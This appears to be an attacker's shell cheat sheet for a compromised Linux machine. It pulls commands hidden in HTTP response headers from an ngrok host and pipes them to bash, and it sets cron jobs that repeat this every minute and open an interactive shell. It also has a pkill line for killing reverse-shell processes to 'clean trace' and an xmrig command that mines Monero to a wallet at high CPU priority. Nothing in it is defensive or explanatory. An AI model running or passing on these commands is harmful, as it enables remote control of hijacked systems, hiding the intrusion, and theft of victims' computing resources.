curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash

#kill
kill -9 $(lsof -t -i :443)
pkill -u mangalamuhurtha -f "acpid.socket|sh -i|cat /tmp/f|/bin/sh -c curl|script -q -c" # use when leave to clean trace
#cron job

# Looks cryptic at a glance
*/1 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
*/5 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^lee:' | cut -d':' -f2- | xargs | script -q -c "/bin/bash" /dev/null


#rig
xmrig --url eu.hashvault.pro:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass zao --donate-level 0 --tls --coin monero -B --randomx-mode=fast --cpu-priority=3 --cpu-no-yield
